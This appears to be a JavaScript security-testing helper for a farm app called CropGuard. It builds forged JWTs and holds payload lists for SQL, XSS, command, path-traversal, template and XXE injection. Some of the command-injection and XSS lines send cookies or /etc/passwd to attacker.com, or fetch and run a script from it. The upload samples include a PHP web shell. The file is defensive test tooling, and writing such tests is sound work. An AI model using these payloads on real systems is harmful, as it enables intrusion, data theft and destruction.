const jwt = require('jsonwebtoken');
const crypto = require('crypto');

/**
 * Security Testing Utilities
 * Comprehensive helper functions for security testing
 */

class SecurityTestUtils {
  constructor() {
    this.JWT_SECRET = process.env.JWT_SECRET || 'test-secret';
    this.vulnerabilityReport = [];
    this.testMetrics = {
      totalTests: 0,
      passedTests: 0,
      failedTests: 0,
      vulnerabilitiesFound: 0,
      criticalIssues: 0,
      highRiskIssues: 0,
      mediumRiskIssues: 0,
      lowRiskIssues: 0
    };
  }

  /**
   * Generate various types of test tokens
   */
  generateTestTokens() {
    const basePayload = {
      id: 1,
      email: 'test@example.com',
      role: 'farmer'
    };

    return {
      validToken: jwt.sign(basePayload, this.JWT_SECRET, { expiresIn: '1h' }),
      expiredToken: jwt.sign(basePayload, this.JWT_SECRET, { expiresIn: '-1h' }),
      adminToken: jwt.sign({ ...basePayload, role: 'admin' }, this.JWT_SECRET, { expiresIn: '1h' }),
      agronomistToken: jwt.sign({ ...basePayload, role: 'agronomist' }, this.JWT_SECRET, { expiresIn: '1h' }),
      malformedToken: 'invalid.jwt.token',
      noneAlgorithmToken: jwt.sign(basePayload, '', { algorithm: 'none' }),
      tamperedToken: this.generateTamperedToken(basePayload)
    };
  }

  /**
   * Generate a tampered JWT token
   */
  generateTamperedToken(payload) {
    const validToken = jwt.sign(payload, this.JWT_SECRET, { expiresIn: '1h' });
    const parts = validToken.split('.');
    
    // Tamper with the payload
    const tamperedPayload = Buffer.from(JSON.stringify({
      ...payload,
      role: 'admin' // Escalate privileges
    })).toString('base64').replace(/=/g, '');
    
    return `${parts[0]}.${tamperedPayload}.${parts[2]}`;
  }

  /**
   * SQL Injection payload generator
   */
  getSQLInjectionPayloads() {
    return {
      basic: [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users--",
        "admin'--"
      ],
      union: [
        "' UNION SELECT username, password FROM admin_users--",
        "' UNION SELECT NULL, version()--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "' UNION SELECT @@version,@@datadir--"
      ],
      blind: [
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND SUBSTRING(version(),1,1)='5'--"
      ],
      errorBased: [
        "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
      ]
    };
  }

  /**
   * XSS payload generator
   */
  getXSSPayloads() {
    return {
      basic: [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)"></iframe>'
      ],
      advanced: [
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        '<img src="/" onerror="document.location=\'http://attacker.com/steal.php?cookie=\'+document.cookie">',
        '<div onmouseover="alert(1)">Hover me</div>',
        '<input onfocus="alert(1)" autofocus>',
        '<object data="javascript:alert(1)"></object>'
      ],
      bypass: [
        '"><script>alert(1)</script>',
        '\'"--><script>alert(1)</script>',
        '</script><script>alert(1)</script>',
        '<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
      ],
      polyglot: [
        'javascript:"/*\'/*`/*-->*/</noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>',
        '/*</script><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"]>\'>SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
      ]
    };
  }

  /**
   * Command injection payload generator
   */
  getCommandInjectionPayloads() {
    return [
      '; rm -rf /',
      '&& cat /etc/passwd',
      '| nc attacker.com 4444',
      '`whoami`',
      '$(id)',
      '; wget http://attacker.com/malware.sh; sh malware.sh',
      '&& curl -X POST -d @/etc/passwd http://attacker.com/exfil',
      '; python -c "import os; os.system(\'rm -rf /\')"',
      '&& powershell -Command "Get-Content C:\\Windows\\System32\\config\\SAM"'
    ];
  }

  /**
   * Path traversal payload generator
   */
  getPathTraversalPayloads() {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam',
      '....%2f....%2f....%2fetc%2fpasswd',
      '../../../proc/version',
      '../../../proc/self/environ',
      '/var/log/auth.log'
    ];
  }

  /**
   * NoSQL injection payload generator
   */
  getNoSQLInjectionPayloads() {
    return [
      { $ne: null },
      { $gt: '' },
      { $regex: '.*' },
      { $where: 'function() { return true; }' },
      { $expr: { $gt: ['$balance', 100] } },
      { $lookup: { from: 'users', localField: '_id', foreignField: 'userId', as: 'userData' } },
      { $or: [{ deleted: false }, { admin: true }] },
      { $and: [{ active: true }, { role: 'admin' }] }
    ];
  }

  /**
   * LDAP injection payload generator
   */
  getLDAPInjectionPayloads() {
    return [
      '*)(uid=*',
      '*)(|(uid=*',
      '*)(&(uid=*',
      '*))%00',
      '*)(objectClass=*',
      '*)(cn=*',
      '*)(|(objectClass=*)(cn=*',
      '*)(|(&(objectClass=user)(!(cn=admin)))(objectClass=*'
    ];
  }

  /**
   * Generate malicious file upload payloads
   */
  getMaliciousFilePayloads() {
    return {
      executableFiles: [
        { name: 'malware.exe', content: Buffer.from('MZ executable'), type: 'application/octet-stream' },
        { name: 'script.bat', content: Buffer.from('@echo off\necho Malicious'), type: 'application/x-bat' },
        { name: 'shell.php', content: Buffer.from('<?php system($_GET["cmd"]); ?>'), type: 'application/x-php' },
        { name: 'backdoor.jsp', content: Buffer.from('<% out.println("JSP Shell"); %>'), type: 'application/x-jsp' }
      ],
      polyglotFiles: [
        {
          name: 'polyglot.jpg',
          content: Buffer.concat([
            Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), // JPEG header
            Buffer.from('<?php system($_GET["cmd"]); ?>'), // PHP code
            Buffer.from([0xFF, 0xD9]) // JPEG footer
          ]),
          type: 'image/jpeg'
        },
        {
          name: 'polyglot.png',
          content: Buffer.concat([
            Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]), // PNG header
            Buffer.from('<script>alert("XSS")</script>'), // JavaScript
            Buffer.from([0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82]) // PNG footer
          ]),
          type: 'image/png'
        }
      ],
      doubleExtensions: [
        'innocent.jpg.exe',
        'image.png.bat',
        'photo.gif.cmd',
        'picture.webp.scr',
        'upload.jpeg.js'
      ]
    };
  }

  /**
   * Generate rate limiting bypass headers
   */
  getRateLimitBypassHeaders() {
    return [
      { 'X-Forwarded-For': '192.168.1.100' },
      { 'X-Real-IP': '10.0.0.1' },
      { 'X-Client-IP': '172.16.0.1' },
      { 'X-Cluster-Client-IP': '203.0.113.1' },
      { 'Forwarded-For': '198.51.100.1' },
      { 'Forwarded': 'for=192.0.2.1' },
      { 'Via': '1.1 proxy.example.com' },
      { 'X-Originating-IP': '127.0.0.1' }
    ];
  }

  /**
   * Generate CORS bypass attempts
   */
  getCORSBypassPayloads() {
    return {
      maliciousOrigins: [
        'http://evil.com',
        'https://attacker.net',
        'http://localhost:3000.evil.com',
        'https://cropguard.com.evil.com',
        'null',
        'file://',
        'data:text/html,<script>alert(1)</script>',
        'javascript:alert(1)'
      ],
      subdomainAttempts: [
        'http://evil.cropguard.com',
        'https://admin.cropguard.com.evil.com',
        'http://api.cropguard.com.attacker.net',
        'https://cropguard.com.evil.org'
      ]
    };
  }

  /**
   * Generate template injection payloads
   */
  getTemplateInjectionPayloads() {
    return [
      '{{7*7}}',
      '${7*7}',
      '<%=7*7%>',
      '<%= system("id") %>',
      '{{config.items()}}',
      '{{request.application.__globals__.__builtins__.__import__("os").system("id")}}',
      '${T(java.lang.System).getProperty("user.name")}',
      '#{7*7}',
      '{%for x in ().__class__.__base__.__subclasses__()%}{%if "warning" in x.__name__%}{{x()._module.__builtins__["__import__"]("os").system("id")}}{%endif%}{%endfor%}'
    ];
  }

  /**
   * Generate XXE attack payloads
   */
  getXXEPayloads() {
    return [
      `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <root>&xxe;</root>`,
      
      `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]>
      <root>&xxe;</root>`,
      
      `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
      <root></root>`,
      
      `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
      <root></root>`
    ];
  }

  /**
   * Vulnerability assessment helper
   */
  assessVulnerability(testName, result, expectedResult, severity = 'medium') {
    const vulnerability = {
      testName,
      timestamp: new Date().toISOString(),
      severity,
      result,
      expectedResult,
      passed: result === expectedResult,
      description: this.getVulnerabilityDescription(testName, result, expectedResult)
    };

    this.vulnerabilityReport.push(vulnerability);
    this.updateMetrics(vulnerability);

    return vulnerability;
  }

  /**
   * Get vulnerability description
   */
  getVulnerabilityDescription(testName, result, expectedResult) {
    const descriptions = {
      'sql_injection': 'SQL injection vulnerability detected. Application may be vulnerable to database attacks.',
      'xss_vulnerability': 'Cross-site scripting vulnerability found. User input is not properly sanitized.',
      'csrf_vulnerability': 'Cross-site request forgery protection may be insufficient.',
      'auth_bypass': 'Authentication bypass detected. Unauthorized access may be possible.',
      'privilege_escalation': 'Privilege escalation vulnerability found. Users may be able to gain elevated access.',
      'information_disclosure': 'Information disclosure vulnerability. Sensitive data may be exposed.',
      'file_upload_vulnerability': 'File upload security issue. Malicious files may be uploaded.',
      'rate_limiting_bypass': 'Rate limiting can be bypassed. Application may be vulnerable to abuse.',
      'directory_traversal': 'Directory traversal vulnerability. System files may be accessible.',
      'command_injection': 'Command injection vulnerability. System commands may be executed.'
    };

    return descriptions[testName] || `Security test ${testName} result: ${result}, expected: ${expectedResult}`;
  }

  /**
   * Update test metrics
   */
  updateMetrics(vulnerability) {
    this.testMetrics.totalTests++;
    
    if (vulnerability.passed) {
      this.testMetrics.passedTests++;
    } else {
      this.testMetrics.failedTests++;
      this.testMetrics.vulnerabilitiesFound++;
      
      switch (vulnerability.severity) {
        case 'critical':
          this.testMetrics.criticalIssues++;
          break;
        case 'high':
          this.testMetrics.highRiskIssues++;
          break;
        case 'medium':
          this.testMetrics.mediumRiskIssues++;
          break;
        case 'low':
          this.testMetrics.lowRiskIssues++;
          break;
      }
    }
  }

  /**
   * Generate comprehensive security report
   */
  generateSecurityReport() {
    const report = {
      metadata: {
        applicationName: 'CropGuard',
        testTimestamp: new Date().toISOString(),
        testDuration: 'N/A',
        testingFramework: 'Jest + Supertest',
        securityStandards: ['OWASP Top 10', 'Agricultural Security Best Practices']
      },
      summary: {
        ...this.testMetrics,
        riskScore: this.calculateRiskScore(),
        overallStatus: this.getOverallStatus()
      },
      vulnerabilities: this.vulnerabilityReport.filter(v => !v.passed),
      recommendations: this.generateRecommendations(),
      complianceStatus: this.assessCompliance(),
      detailedFindings: this.categorizeFindings()
    };

    return report;
  }

  /**
   * Calculate risk score
   */
  calculateRiskScore() {
    const weights = { critical: 10, high: 7, medium: 4, low: 1 };
    const totalRisk = 
      (this.testMetrics.criticalIssues * weights.critical) +
      (this.testMetrics.highRiskIssues * weights.high) +
      (this.testMetrics.mediumRiskIssues * weights.medium) +
      (this.testMetrics.lowRiskIssues * weights.low);

    const maxPossibleRisk = this.testMetrics.totalTests * weights.critical;
    return maxPossibleRisk > 0 ? Math.round((totalRisk / maxPossibleRisk) * 100) : 0;
  }

  /**
   * Get overall security status
   */
  getOverallStatus() {
    if (this.testMetrics.criticalIssues > 0) return 'CRITICAL';
    if (this.testMetrics.highRiskIssues > 0) return 'HIGH_RISK';
    if (this.testMetrics.mediumRiskIssues > 2) return 'MEDIUM_RISK';
    if (this.testMetrics.lowRiskIssues > 5) return 'LOW_RISK';
    return 'SECURE';
  }

  /**
   * Generate security recommendations
   */
  generateRecommendations() {
    const recommendations = [];
    const vulnerabilities = this.vulnerabilityReport.filter(v => !v.passed);

    // Input validation recommendations
    if (vulnerabilities.some(v => v.testName.includes('injection'))) {
      recommendations.push({
        category: 'Input Validation',
        priority: 'HIGH',
        recommendation: 'Implement comprehensive input validation and sanitization for all user inputs.',
        implementation: 'Use parameterized queries, input validation libraries, and output encoding.'
      });
    }

    // Authentication recommendations
    if (vulnerabilities.some(v => v.testName.includes('auth'))) {
      recommendations.push({
        category: 'Authentication',
        priority: 'HIGH',
        recommendation: 'Strengthen authentication mechanisms and session management.',
        implementation: 'Implement multi-factor authentication, secure session handling, and proper token validation.'
      });
    }

    // Authorization recommendations
    if (vulnerabilities.some(v => v.testName.includes('privilege') || v.testName.includes('access'))) {
      recommendations.push({
        category: 'Authorization',
        priority: 'HIGH',
        recommendation: 'Implement proper access controls and role-based authorization.',
        implementation: 'Use principle of least privilege, implement proper RBAC, and validate permissions consistently.'
      });
    }

    // File upload recommendations
    if (vulnerabilities.some(v => v.testName.includes('file'))) {
      recommendations.push({
        category: 'File Upload Security',
        priority: 'MEDIUM',
        recommendation: 'Enhance file upload security controls.',
        implementation: 'Validate file types, scan for malware, use secure file storage, and implement size limits.'
      });
    }

    // Rate limiting recommendations
    if (vulnerabilities.some(v => v.testName.includes('rate'))) {
      recommendations.push({
        category: 'Rate Limiting',
        priority: 'MEDIUM',
        recommendation: 'Improve rate limiting implementation.',
        implementation: 'Use distributed rate limiting, implement progressive delays, and monitor for abuse patterns.'
      });
    }

    return recommendations;
  }

  /**
   * Assess compliance with security standards
   */
  assessCompliance() {
    return {
      owaspTop10: {
        status: this.testMetrics.criticalIssues === 0 && this.testMetrics.highRiskIssues < 3 ? 'COMPLIANT' : 'NON_COMPLIANT',
        details: 'Assessment based on OWASP Top 10 security testing results'
      },
      agriculturalSecurity: {
        status: this.testMetrics.vulnerabilitiesFound < 5 ? 'COMPLIANT' : 'NEEDS_IMPROVEMENT',
        details: 'Assessment of agricultural-specific security requirements'
      },
      dataProtection: {
        status: this.vulnerabilityReport.filter(v => v.testName.includes('data') && !v.passed).length === 0 ? 'COMPLIANT' : 'NON_COMPLIANT',
        details: 'Assessment of data protection and privacy controls'
      }
    };
  }

  /**
   * Categorize security findings
   */
  categorizeFindings() {
    const categories = {
      inputValidation: [],
      authentication: [],
      authorization: [],
      dataProtection: [],
      fileUpload: [],
      infrastructureSecurity: [],
      agriculturalSpecific: []
    };

    this.vulnerabilityReport.forEach(vulnerability => {
      if (vulnerability.testName.includes('injection') || vulnerability.testName.includes('xss')) {
        categories.inputValidation.push(vulnerability);
      } else if (vulnerability.testName.includes('auth') || vulnerability.testName.includes('jwt')) {
        categories.authentication.push(vulnerability);
      } else if (vulnerability.testName.includes('privilege') || vulnerability.testName.includes('access')) {
        categories.authorization.push(vulnerability);
      } else if (vulnerability.testName.includes('data') || vulnerability.testName.includes('privacy')) {
        categories.dataProtection.push(vulnerability);
      } else if (vulnerability.testName.includes('file') || vulnerability.testName.includes('upload')) {
        categories.fileUpload.push(vulnerability);
      } else if (vulnerability.testName.includes('infrastructure') || vulnerability.testName.includes('config')) {
        categories.infrastructureSecurity.push(vulnerability);
      } else if (vulnerability.testName.includes('agricultural') || vulnerability.testName.includes('farm')) {
        categories.agriculturalSpecific.push(vulnerability);
      }
    });

    return categories;
  }

  /**
   * Reset test metrics and vulnerability report
   */
  reset() {
    this.vulnerabilityReport = [];
    this.testMetrics = {
      totalTests: 0,
      passedTests: 0,
      failedTests: 0,
      vulnerabilitiesFound: 0,
      criticalIssues: 0,
      highRiskIssues: 0,
      mediumRiskIssues: 0,
      lowRiskIssues: 0
    };
  }

  /**
   * Helper to create test delay for timing attack testing
   */
  async measureResponseTime(requestFunction) {
    const start = Date.now();
    await requestFunction();
    return Date.now() - start;
  }

  /**
   * Helper to generate random test data
   */
  generateRandomData(type = 'string', length = 10) {
    switch (type) {
      case 'string':
        return crypto.randomBytes(length).toString('hex');
      case 'email':
        return `test${crypto.randomBytes(5).toString('hex')}@example.com`;
      case 'number':
        return Math.floor(Math.random() * 1000000);
      case 'boolean':
        return Math.random() > 0.5;
      default:
        return crypto.randomBytes(length).toString('hex');
    }
  }

  /**
   * Helper to create mock database responses
   */
  createMockDatabaseResponses() {
    return {
      validUser: {
        id: 1,
        email: 'test@example.com',
        password: '$2a$10$hashedpassword',
        role: 'farmer',
        is_active: 1
      },
      adminUser: {
        id: 2,
        email: 'admin@example.com',
        password: '$2a$10$hashedpassword',
        role: 'admin',
        is_active: 1
      },
      inactiveUser: {
        id: 3,
        email: 'inactive@example.com',
        password: '$2a$10$hashedpassword',
        role: 'farmer',
        is_active: 0
      },
      null: null,
      error: new Error('Database connection failed')
    };
  }
}

module.exports = SecurityTestUtils;